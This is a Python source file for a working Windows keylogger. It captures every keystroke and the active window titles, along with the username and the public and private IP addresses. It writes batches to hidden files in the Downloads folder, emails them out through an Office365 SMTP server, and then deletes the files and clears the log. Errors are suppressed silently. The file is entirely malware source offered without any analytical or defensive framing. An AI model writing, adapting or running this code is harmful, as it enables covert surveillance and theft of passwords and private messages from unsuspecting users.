import os
import random
import smtplib
import socket
import threading
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests
import win32gui
from pynput.keyboard import Listener


datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

msg = f'[Log Start]\n  *~ Date/Time: {datetime}\n  *~ User: {user}\n  *~ Pub-IP: {publicIP}\n  *~ Priv-IP: {privateIP}\n\n'
logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []


def on_press(Key):
	global old_app

	new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

	if new_app == 'Cortana':
		new_app = 'Windows Start Menu'
	else:
		pass
	
	
	if new_app != old_app and new_app != '':
		logged_data.append(f'[{datetime}] ~ {new_app}\n')
		old_app = new_app
	else:
		pass

	key = str(Key).strip('\'')
	logged_data.append(key)


def write_file(count):
	one = os.path.expanduser('~') + '/Downloads/'
	list = [one]

	filepath = random.choice(list)
	filename = str(count) + 'I' + str(random.randint(1000000,9999999)) + '.txt'
	file = filepath + filename
	delete_file.append(file)


	with open(file,'w') as fp:
		fp.write(''.join(logged_data))
	


def send_logs():
	count = 0
	# External File is optimal for fromaddr and frompaswd
	fromAddr = ''
	fromPswd = ''
	toAddr = fromAddr

	time.sleep(20)
	while True:
		if len(logged_data) > 50:
			try:
				write_file(count)

				subject = f'[{user}] ~ {count}'

				msg = MIMEMultipart()
				msg['From'] = fromAddr
				msg['To'] = toAddr
				msg['Subject'] = subject
				body = 'testing'
				msg.attach(MIMEText(body,'plain'))

				attachment = open(delete_file[0],'rb')
				

				filename = delete_file[0].split('/')[2]

				part = MIMEBase('application','octect-stream')
				part.set_payload((attachment).read())
				encoders.encode_base64(part)
				part.add_header('content-disposition','attachment;filename='+str(filename))
				msg.attach(part)

				text = msg.as_string()
				
				## Google SMTP server disallows simple logins
				s = smtplib.SMTP('smtp.office365.com',587)
				s.ehlo()
				s.starttls()
				print('starttls')
				s.ehlo()
				s.login(fromAddr,fromPswd)
				s.sendmail(fromAddr,toAddr,text)
				print('sent mail')
				attachment.close()
				s.close()

				os.remove(delete_file[0])
				del logged_data[1:]
				del delete_file[0:]
				print('delete data/files')
    
				count += 1

			except Exception as errorString:
				pass




if __name__=='__main__':
	T1 = threading.Thread(target=send_logs)
	T1.start()

	with Listener(on_press=on_press) as listener:
		listener.join()

